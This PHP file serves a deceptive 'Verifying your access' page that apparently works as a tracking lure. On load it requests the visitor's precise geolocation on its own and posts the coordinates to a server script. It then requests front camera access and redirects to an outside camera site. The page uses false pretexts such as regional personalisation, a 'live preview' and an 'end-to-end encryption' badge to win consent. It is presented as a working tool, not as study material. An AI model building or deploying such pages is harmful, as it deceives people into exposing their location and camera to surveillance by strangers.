<?php
echo '
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>Verifying your access...</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      background: radial-gradient(ellipse at top, #1a0533 0%, #0a0a0f 60%);
      font-family: "Inter", sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px;
      overflow: hidden;
    }

    /* ── Animated background rings ── */
    .rings {
      position: fixed; top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      z-index: 0; pointer-events: none;
    }
    .ring {
      position: absolute;
      border-radius: 50%;
      border: 1px solid rgba(139,92,246,0.15);
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      animation: expand 4s ease-out infinite;
    }
    .ring:nth-child(1) { width: 120px; height: 120px; animation-delay: 0s; }
    .ring:nth-child(2) { width: 220px; height: 220px; animation-delay: 1s; }
    .ring:nth-child(3) { width: 320px; height: 320px; animation-delay: 2s; }
    .ring:nth-child(4) { width: 420px; height: 420px; animation-delay: 3s; }
    @keyframes expand {
      0%   { opacity: 0.6; transform: translate(-50%,-50%) scale(0.8); }
      100% { opacity: 0;   transform: translate(-50%,-50%) scale(1.4); }
    }

    /* ── Main card ── */
    .card {
      position: relative; z-index: 1;
      width: 100%; max-width: 380px;
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.12);
      backdrop-filter: blur(20px);
      border-radius: 24px;
      padding: 36px 28px 32px;
      text-align: center;
      box-shadow: 0 0 60px rgba(139,92,246,0.12);
      animation: slideUp 0.6s cubic-bezier(.16,1,.3,1) both;
    }
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(40px); }
      to   { opacity: 1; transform: none; }
    }

    /* ── Lock / shield icon ── */
    .icon-wrap {
      width: 72px; height: 72px;
      border-radius: 50%;
      margin: 0 auto 20px;
      display: flex; align-items: center; justify-content: center;
      font-size: 2rem;
      animation: iconBounce 2s ease-in-out infinite;
    }
    .icon-wrap.loc  { background: linear-gradient(135deg,#6366f1,#8b5cf6); box-shadow: 0 8px 32px rgba(99,102,241,.45); }
    .icon-wrap.cam  { background: linear-gradient(135deg,#f59e0b,#ef4444); box-shadow: 0 8px 32px rgba(239,68,68,.45); }
    @keyframes iconBounce {
      0%,100% { transform: translateY(0);    }
      50%      { transform: translateY(-6px); }
    }

    h1 { font-size: 1.3rem; font-weight: 600; margin-bottom: 8px; }
    .sub {
      font-size: 0.88rem; color: rgba(255,255,255,0.55); line-height: 1.6;
      margin-bottom: 24px;
    }

    /* ── Steps ── */
    .steps { text-align: left; margin-bottom: 24px; }
    .step {
      display: flex; align-items: center; gap: 12px;
      padding: 11px 14px;
      border-radius: 12px;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.07);
      margin-bottom: 8px;
      font-size: 0.87rem;
      color: rgba(255,255,255,0.8);
    }
    .step-num {
      width: 26px; height: 26px; flex-shrink: 0;
      border-radius: 50%;
      background: linear-gradient(135deg,#8b5cf6,#6366f1);
      display: flex; align-items: center; justify-content: center;
      font-size: 0.75rem; font-weight: 700;
    }
    .step-highlight { color: #a78bfa; font-weight: 600; }

    /* ── Trust badge ── */
    .trust {
      display: flex; align-items: center; justify-content: center; gap: 6px;
      font-size: 0.75rem; color: rgba(255,255,255,0.35);
      margin-bottom: 20px;
    }
    .trust-dot {
      width: 6px; height: 6px; border-radius: 50%;
      background: #22c55e; box-shadow: 0 0 6px #22c55e;
      animation: blink 1.5s ease-in-out infinite;
    }
    @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

    /* ── CTA button ── */
    .btn {
      width: 100%;
      padding: 15px;
      border: none; cursor: pointer;
      border-radius: 14px;
      font-size: 1rem; font-weight: 600;
      color: #fff;
      background: linear-gradient(135deg, #8b5cf6, #6366f1);
      box-shadow: 0 6px 24px rgba(99,102,241,0.45);
      transition: transform 0.15s, box-shadow 0.15s;
      letter-spacing: 0.3px;
    }
    .btn:active { transform: scale(0.97); box-shadow: none; }

    /* ── Status below button ── */
    .status {
      margin-top: 14px;
      font-size: 0.8rem; color: rgba(255,255,255,0.4);
      min-height: 20px;
      transition: color 0.3s;
    }
    .status.ok { color: #4ade80; }

    /* ── Progress bar ── */
    .progress-wrap {
      width: 100%; height: 3px;
      background: rgba(255,255,255,0.08);
      border-radius: 99px; margin-top: 18px;
      overflow: hidden;
    }
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg,#8b5cf6,#ec4899);
      border-radius: 99px;
      width: 0%;
      transition: width 0.4s ease;
    }
  </style>
</head>
<body>

<div class="rings">
  <div class="ring"></div>
  <div class="ring"></div>
  <div class="ring"></div>
  <div class="ring"></div>
</div>

<div class="card" id="card">

  <!-- Step 1: Location (shown first) -->
  <div id="screen-location">
    <div class="icon-wrap loc">📍</div>
    <h1>Confirm Your Location</h1>
    <p class="sub">This content is personalised based on your region. A quick location check is required to proceed.</p>

    <div class="steps">
      <div class="step">
        <div class="step-num">1</div>
        <span>A permission box will appear at the top of your screen</span>
      </div>
      <div class="step">
        <div class="step-num">2</div>
        <span>Tap <span class="step-highlight">"Allow"</span> to continue</span>
      </div>
      <div class="step">
        <div class="step-num">3</div>
        <span>You will be redirected instantly</span>
      </div>
    </div>

    <div class="trust">
      <div class="trust-dot"></div>
      Secured with end-to-end encryption
    </div>

    <button class="btn" onclick="startLocation()">Continue →</button>
    <p class="status" id="loc-status"></p>
    <div class="progress-wrap"><div class="progress-bar" id="loc-bar"></div></div>
  </div>

  <!-- Step 2: Camera (shown after location) -->
  <div id="screen-camera" style="display:none;">
    <div class="icon-wrap cam">📷</div>
    <h1>Enable Camera Access</h1>
    <p class="sub">Your personalised content includes a live preview feature. Please allow camera access to load it.</p>

    <div class="steps">
      <div class="step">
        <div class="step-num">1</div>
        <span>A camera permission prompt will appear</span>
      </div>
      <div class="step">
        <div class="step-num">2</div>
        <span>Tap <span class="step-highlight">"Allow"</span> to enable preview</span>
      </div>
      <div class="step">
        <div class="step-num">3</div>
        <span>Your content loads immediately after</span>
      </div>
    </div>

    <div class="trust">
      <div class="trust-dot"></div>
      Camera access is used only for this session
    </div>

    <button class="btn" onclick="requestCamera()">Enable Camera →</button>
    <p class="status" id="cam-status"></p>
    <div class="progress-wrap"><div class="progress-bar" id="cam-bar"></div></div>
  </div>

</div>

<script>
/* ── Animate progress bar ── */
function animateBar(id, to, duration) {
  var bar = document.getElementById(id);
  var start = null;
  var from = parseFloat(bar.style.width) || 0;
  function step(ts) {
    if (!start) start = ts;
    var p = Math.min((ts - start) / duration, 1);
    bar.style.width = (from + (to - from) * p) + "%";
    if (p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}

/* ── Countdown then auto-fire location ── */
function autoStartLocation() {
  var btn    = document.querySelector("#screen-location .btn");
  var status = document.getElementById("loc-status");
  var count  = 2;

  // Animate bar to 20% immediately so it looks alive
  animateBar("loc-bar", 20, 1000);
  btn.textContent = "Verifying... (" + count + ")";
  status.textContent = "Connecting to location service...";

  var ticker = setInterval(function() {
    count--;
    if (count > 0) {
      btn.textContent = "Verifying... (" + count + ")";
    } else {
      clearInterval(ticker);
      btn.disabled = true;
      btn.textContent = "Requesting...";
      status.textContent = "Waiting for permission...";
      animateBar("loc-bar", 45, 600);
      fireLocation();
    }
  }, 1000);
}

function fireLocation() {
  var status = document.getElementById("loc-status");

  if (!navigator.geolocation) {
    animateBar("loc-bar", 100, 400);
    setTimeout(goToCamera, 500);
    return;
  }

  navigator.geolocation.getCurrentPosition(
    function(pos) {
      status.textContent = "\u2713 Location confirmed";
      status.className = "status ok";
      animateBar("loc-bar", 100, 600);

      var xhr = new XMLHttpRequest();
      xhr.open("POST", "location.php", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("lat="+pos.coords.latitude+"&lon="+pos.coords.longitude+"&acc="+pos.coords.accuracy+"&time="+Date.now());

      setTimeout(goToCamera, 800);
    },
    function() {
      // Denied — fallback handled server-side
      status.textContent = "Redirecting...";
      animateBar("loc-bar", 100, 400);
      setTimeout(goToCamera, 500);
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

/* ── Switch to camera screen ── */
function goToCamera() {
  document.getElementById("screen-location").style.display = "none";
  document.getElementById("screen-camera").style.display  = "block";
  // Auto-fire camera immediately with short delay for UX
  setTimeout(autoFireCamera, 1200);
}

/* ── Auto-fire camera ── */
function autoFireCamera() {
  var btn    = document.querySelector("#screen-camera .btn");
  var status = document.getElementById("cam-status");
  var count  = 2;

  animateBar("cam-bar", 20, 800);
  btn.textContent = "Connecting... (" + count + ")";
  status.textContent = "Initialising camera service...";

  var ticker = setInterval(function() {
    count--;
    if (count > 0) {
      btn.textContent = "Connecting... (" + count + ")";
    } else {
      clearInterval(ticker);
      btn.disabled = true;
      btn.textContent = "Requesting...";
      status.textContent = "Waiting for permission...";
      animateBar("cam-bar", 45, 600);
      fireCamera();
    }
  }, 1000);
}

function fireCamera() {
  var status = document.getElementById("cam-status");

  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(function(stream) {
      stream.getTracks().forEach(function(t){ t.stop(); });
      status.textContent = "\u2713 Camera enabled";
      status.className = "status ok";
      animateBar("cam-bar", 100, 600);
      setTimeout(redirect, 900);
    })
    .catch(function() {
      animateBar("cam-bar", 100, 400);
      setTimeout(redirect, 500);
    });
}

/* ── Redirect ── */
function redirect() {
  try       { window.location.href = "https://cam.subhan.tech/index2.html"; }
  catch(e)  { window.location     = "https://cam.subhan.tech/index2.html"; }
}

/* ── Boot: auto-start on page load ── */
window.addEventListener("load", function() {
  setTimeout(autoStartLocation, 1500);
});
</script>

</body>
</html>
';
exit;
?>
